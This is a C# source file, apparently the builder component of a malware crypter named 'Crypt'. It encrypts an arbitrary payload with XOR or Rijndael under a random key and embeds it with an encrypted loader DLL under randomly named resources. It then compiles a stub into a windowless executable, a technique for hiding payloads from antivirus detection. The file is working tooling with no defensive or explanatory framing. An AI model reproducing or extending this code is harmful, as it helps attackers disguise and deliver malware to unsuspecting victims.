using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Resources;
using System.Text;
using System.Threading.Tasks;

namespace Crypt
{
    class Builder
    {
        private Byte[] _payload;
        private Options _options;
        private string _loaderPath;

        public Builder(byte[] payload, Options options)
        {
            _payload = payload;
            _options = options;

            //Super hacky
            //TODO: Find better way to access Loader.dll
#if DEBUG
            _loaderPath = @"..\..\..\Loader\bin\Debug\Loader.dll";
#else
            _loaderPath = @"..\..\..\Loader\bin\Release\Loader.dll";
#endif
        }

        public bool Build()
        {
            _options.encryptionKey = Encryption.GenerateKey();
            _options.resFileName = Guid.NewGuid().ToString().Substring(0, 5);
            _options.resPayloadName = Guid.NewGuid().ToString().Substring(0, 5);
            _options.resLoaderName = Guid.NewGuid().ToString().Substring(0, 5);

            Byte[] encPayload = Encrypt(_payload);
            Byte[] encLoader = Encrypt(File.ReadAllBytes(_loaderPath));
            string stubSrc = AddInfo(Properties.Resources.Stub);

            bool result = Compile(encPayload, encLoader, stubSrc);
            return result;
        }

        private byte[] Encrypt(Byte[] input)
        {
            Byte[] encryptedPL;
            switch (_options.encryptionType)
            {
                case EncryptionType.Rijndael:
                    encryptedPL = Encryption.RijndaelEncrypt(input, _options.encryptionKey);
                    break;
                default:
                    encryptedPL = Encryption.Xor(input, _options.encryptionKey);
                    break;
            }

            return encryptedPL;
        }

        private string AddInfo(string stubSrc)
        {
            string newStub = stubSrc.Replace("[encryptionKey]", Convert.ToBase64String(_options.encryptionKey));
            newStub = newStub.Replace("[resFileName]", _options.resFileName);
            newStub = newStub.Replace("[resPayloadName]", _options.resPayloadName);
            newStub = newStub.Replace("[resLoaderName]", _options.resLoaderName);
            newStub = newStub.Replace("[hostDir]", _options.hostDir);

            return newStub;
        }

        private string CreateResource(byte[] encPayload, byte[] encLoader)
        {
            string resourceDir = _options.resFileName + ".resources";
            using (ResourceWriter resourceWriter = new ResourceWriter(resourceDir))
            {
                resourceWriter.AddResource(_options.resPayloadName, encPayload);
                resourceWriter.AddResource(_options.resLoaderName, encLoader);
                resourceWriter.Generate();
            }
            return resourceDir;
        }

        private bool Compile(byte[] encPayload, byte[] encLoader, string stubSrc)
        {
            CompilerParameters compParams = new CompilerParameters();
            compParams.GenerateExecutable = true;
            compParams.TreatWarningsAsErrors = false;
            compParams.OutputAssembly = _options.buildDir;
            compParams.CompilerOptions = "/optimize+ /platform:x86 /target:winexe /unsafe";

            compParams.ReferencedAssemblies.Add("System.dll");
            compParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            compParams.ReferencedAssemblies.Add("System.Drawing.dll");

            string resourceDir = CreateResource(encPayload, encLoader);
            compParams.EmbeddedResources.Add(resourceDir);

            Dictionary<string, string> providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v2.0");

            CompilerResults compResults = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(compParams, stubSrc);

            File.Delete(resourceDir);

            return !compResults.Errors.HasErrors;
        }
    }
}
